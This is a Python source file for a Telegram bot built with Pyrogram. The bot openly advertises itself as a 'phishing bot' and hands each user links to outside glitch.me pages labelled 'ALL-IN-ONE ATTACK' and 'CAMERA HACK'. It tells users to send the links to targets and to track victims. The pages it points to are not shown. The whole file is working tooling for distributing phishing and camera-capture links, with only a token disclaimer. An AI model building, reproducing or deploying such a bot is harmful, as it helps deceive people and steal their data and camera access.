import os
import asyncio
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# 🔐 API Credentials
API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

# 🚀 Initialize the Bot
app = Client("vip_phishing_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# 🎭 Start Command Handler
@app.on_message(filters.private & filters.command("start"))
async def start_command(client, message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
         InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")]
    ])
    
    welcome_text = (
        "🔰 Welcome to the Ultimate Phishing Bot! 🔰\n\n"
        "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
        "🎯 Track victims in real-time & collect data effortlessly.\n\n"
        "🛑 Warning: High Security System Activated 🛑\n\n"
        "⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️"
    )

    await message.reply_text(welcome_text, reply_markup=keyboard)

# 🔄 Callback Query Handler with Dynamic Loading Animation
@app.on_callback_query()
async def callback_handler(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data

    # 🌐 Generate Phishing Links
    links = {
        "all_in_one": ("ALL-IN-ONE ATTACK", f"https://trail-charm-waterlily.glitch.me/?id={user_id}"),
        "camera_hack": ("CAMERA HACK", f"https://four-political-blouse.glitch.me/?id={user_id}")
    }

    if data in links:
        page_name, link = links[data]

        # ⏳ Send Dynamic Loading Animation
        loading_stages = [
            "🚀 S", "🚀 ST", "🚀 STA", "🚀 STAR", "🚀 START",
            "🚀 STARTI", "🚀 STARTIN", "🚀 STARTING... 🔥"
        ]
        loading_message = await callback_query.message.reply_text("🚀 S")

        for stage in loading_stages[1:]:
            await asyncio.sleep(0.1)
            await loading_message.edit_text(stage)

        await asyncio.sleep(0.1)  # Short pause before deleting the loading message
        await loading_message.delete()

        # 📝 Send the Generated Link (Without Code Format)
        message_text = (
            f"🛠 *Page Name:* {page_name}\n"
            f"🔗 *Link:* {link}\n\n"
            f"🎯 Just send this to your target!"
        )

        await callback_query.message.reply_text(
            message_text, parse_mode=enums.ParseMode.MARKDOWN
        )
    else:
        await callback_query.answer("❌ Invalid selection!", show_alert=True)

# 🚀 Run the Bot
if __name__ == "__main__":
    app.run()
